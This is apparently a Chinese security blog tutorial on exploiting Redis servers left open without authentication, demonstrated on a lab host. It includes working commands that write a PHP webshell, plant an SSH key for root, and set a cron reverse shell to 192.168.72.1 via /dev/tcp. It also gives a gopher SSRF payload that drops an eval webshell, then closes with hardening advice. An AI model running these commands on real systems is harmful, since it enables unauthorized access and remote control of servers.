---
title: "Redis Unauthorized Access"
date: 2021-06-08T21:20:11+08:00
toc: On
---

## 0x01 前言

**REmote DIctionary Server**(Redis) 是完全开源免费的，遵守BSD协议，Redis是一个由Salvatore Sanfilippo写的key-value存储系统。

 Redis 与其他它key - value 缓存产品有以下三个特点：

- Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。
- Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。
- Redis支持数据的备份，即master-slave模式的数据备份。

Redis因配置不当可造成未授权访问。攻击者无需通过身份认证便可访问到内部数据，造成敏感信息泄露，也可以恶意执行flushall来清空所有数据。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。

## 0x02 部署redis

```bash
# Download
wget http://download.redis.io/releases/redis-stable.tar.gz
# Decompression
tar -zxvf redis-stable.tar.gz
# Compile
cd redis-stable
make
# Run
cd src

sudo ./redis-server
#最新版本redis已经默认启动为普通用户 写ssh公钥和定时计划需root用户
```
![image-20210608213959530](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-08-image-20210608213959530.png)

## 0x03 写 Webshell

```
# kali @ kali in ~/redis-stable/src [9:44:29] 
$ ./redis-cli
127.0.0.1:6379> config set dir /var/www/html
OK
127.0.0.1:6379>  config set dbfilename hack.php
OK
127.0.0.1:6379> set shell "<?php phpinfo(); ?>"
OK
127.0.0.1:6379> save
OK
```
```
# kali @ kali in /var/www/html [9:46:40] 
$ cat hack.php 
REDIS0009�      redis-ver6.0.5�
�edis-bits�@�ctime�ct�`used-mem�5
 aof-preamble���shell<?php phpinfo(); ?>xB?
```

## 0x04 写入SSH公钥

首先我们需要判断redis 服务端是否为root用户启动。如果不是只能在`~/.ssh`写入(用处比较小)。如果为root权限，我们需要确定`/root`下是否有`.ssh`目录，以及`etc/ssh/sshd_config `下写有`PermitRootLogin yes`，好在以上两点都可以动过写入计划任务来实现。

```
flushall
set 1 `\n\n\nyour ssh-rsa public key\n\n\n`
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```

## 0x05 Crontab 定时任务

这个方法只能`Centos`上使用，`Ubuntu上行不通`，原因如下：

1. 因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件`/var/spool/cron/crontabs/<username>`权限必须是600也就是`-rw-------`才会执行，否则会报错`(root) INSECURE MODE (mode 0600 expected)`，而Centos的定时任务文件`/var/spool/cron/<username>`权限644也能执行
2. 因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错

由于系统的不同，crontrab定时文件位置也会不同
 Centos的定时任务文件在`/var/spool/cron/<username>`
 Ubuntu定时任务文件在`/var/spool/cron/crontabs/<username>`

```
127.0.0.1:6379> flushall
OK
127.0.0.1:6379> set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.72.1/12345 0>&1\n\n'
OK
127.0.0.1:6379> config set dir /var/spool/cron/
OK
127.0.0.1:6379> config set dbfilename root
OK
127.0.0.1:6379> save
OK
```

![image-20210608221440872](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-08-image-20210608221440872.png)

## 0x06 Redis RCE

留个坑，不是很好理解

https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf

## 0x07 SSRF与Redis

首先我们需要知道Redis服务端与客户端的通信方式：

`Redis`服务器与客户端通过`RESP`（**REdis Serialization Protocol**）协议通信。
 RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。
 RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。

RESP在Redis中用作请求 - 响应协议的方式如下：

1. 客户端将命令作为`Bulk Strings`的RESP数组发送到Redis服务器。
2. 服务器根据命令实现回复一种RESP类型。

在RESP中，某些数据的类型取决于第一个字节：
 对于`Simple Strings`，回复的第一个字节是`+`
 对于`error`，回复的第一个字节是`-`
 对于`Integer`，回复的第一个字节是`:`
 对于`Bulk Strings`，回复的第一个字节是`$`
 对于`array`，回复的第一个字节是`*`
 此外，`RESP`能够使用稍后指定的`Bulk Strings`或`Array`的特殊变体来表示`Null`值。
 在RESP中，协议的不同部分始终以`"\r\n"(CRLF)`结束。

我们通过**wireshake**抓包简单理解以下。

```
127.0.0.1:6379> set name theoyu
OK
127.0.0.1:6379> get name
"theoyu"
```

![image-20210608223621767](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-08-image-20210608223621767.png)

**Hex Dump**:

![image-20210608224917392](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-08-image-20210608224917392.png)

正如前面所说，客户端向将命令作为`Bulk Strings`的RESP数组发送到Redis服务器，比如第一条指令可认作:`["set","name","theoyu"]`,`*3`表示数组长度为3，`$3`表示字符串长度，`0d0a`也就是`\r\n`为结束符。

ok明白了这些，直接构造命令编码，利用gopher协议即可。

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2436%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27theoyu%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

## 0x08 Protection
1.禁止外网访问 Redis。修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用：
```
bind 127.0.0.1
```

2.以低权限运行 Redis 服务。

3.Redis 添加密码验证。修改 redis.conf ，添加：
```
requirepass yourpassword
```

4.禁止一些高危命令。修改 `redis.conf` 文件，添加如下选项来禁用远程修改 dir/dbfilename。

```
rename-command FLUSHALL ""
rename-command CONFIG ""
rename-command EVAL ""
```

5.保证 `authorized_keys` 文件的安全。为保证安全，阻止其他用户添加新的公钥。将 `authorized_keys` 的权限设置为对拥有者只读，其他用户没有任何权限：
```
chmod 400 ~/.ssh/authorized_keys
```
为保证 authorized_keys 的权限不会被改掉，还可以设置该文件的 `immutable` 位权限：
```
chattr +i ~/.ssh/authorized_keys
```
然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：
 ```
chattr +i ~/.ssh
 ```
**注**：如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。

## 0x09 Reference

https://xz.aliyun.com/t/5665

https://3nd.xyz/2019/11/26/Redis-unauthenticate-exploit.html

https://xz.aliyun.com/t/5616